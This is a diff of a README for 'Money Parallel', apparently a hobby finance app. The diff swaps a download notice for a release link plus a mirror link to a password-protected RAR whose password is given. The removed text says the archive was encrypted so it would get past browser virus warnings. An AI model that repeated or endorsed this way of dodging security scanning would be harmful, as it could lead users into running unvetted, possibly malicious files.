@@ -9,13 +9,10 @@ Money Parallel is my little (and first full) coding project. It's an app where y
 
 ## Download Latest Version
 Latest Version (1.0.0)
-**IMPORTANT!!** 
-  Some devices may have trouble downloading the file because Chrome incorrectly flags it as containing a virus. I assure you this is just a simple coding project. If you want to verify, you can upload the file to VirusTotal. As shown below, 0 out of 68 antivirus engines   detect any issues. To bypass these false security warnings from Chrome or other browsers, the file has been encrypted with a password.
-  Password to unlock the file: moneyapp2
+[Go To Release Page](https://github.com/SirPerryyy/Money-Parallel/releases/tag/CodingProject)
 
-  <img width="1315" height="195" alt="image" src="https://github.com/user-attachments/assets/75f72e21-0f14-4379-892d-97d1cc69d9d6" />
-
-[Download File Password : "moneyapp2"](https://github.com/SirPerryyy/Money-Parallel/raw/refs/heads/main/Money%20Parallel%201.0.0.rar)
+If the file could not be downloaded from there download this instead:
+[Mirror File : "moneyapp2"](https://github.com/SirPerryyy/Money-Parallel/raw/refs/heads/main/Money%20Parallel%201.0.0.rar)
 
 ## App Overview
 
